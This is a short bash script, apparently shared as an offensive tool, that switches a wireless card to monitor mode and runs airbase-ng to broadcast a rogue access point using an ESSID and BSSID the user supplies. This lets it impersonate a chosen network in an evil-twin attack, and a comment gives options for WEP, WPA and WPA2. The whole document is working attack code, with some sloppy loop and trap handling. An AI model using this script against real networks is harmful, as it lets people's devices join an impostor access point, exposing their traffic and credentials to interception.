#!/bin/bash
# anotherik

# Script to create Rogue APs using Airbase-ng

printf "Enter the essid: "
read essid
printf "Enter the bssid: "
read bssid
printf "Enter the channel: " 
read channel
printf "Enter the interface: "
read iface

{
  printf "Trying to set up interface to monitor mode...\n"

  sudo ifconfig $iface down
  sudo iwconfig $iface mode monitor
  sudo ifconfig $iface up

  printf "Changing channel...\n"

  sudo iw dev $iface set channel $channel
} || { 
  printf "Something went wrong...\n" 
}

{ # try

  while [ True ]; do
    trap ctrl_c INT
    
    function ctrl_c() {
      printf "\nSetting up managed mode...\n"
      ifconfig $iface down
      iwconfig $iface mode managed
      ifconfig $iface up
      printf "Exit..."
      exit 0
    }

    {
      airbase-ng $iface -c $channel
      printf "Starting AP...\n"
      airbase-ng -e $essid -a $bssid -W 1 -Z 2 -c $channel $iface # [-W 1 (for wep)/ -W 1 -z 2 (for wpa)/ -W 1 -Z 2 (for wpa2), -Z 2 = TKIP and -Z 4 = CCMP] -c $channel
    } || { 
      printf "Something went wrong...\n"
      exit 2 
    }
  done
} || { # catch
    printf "Nothing to do!\n"
}

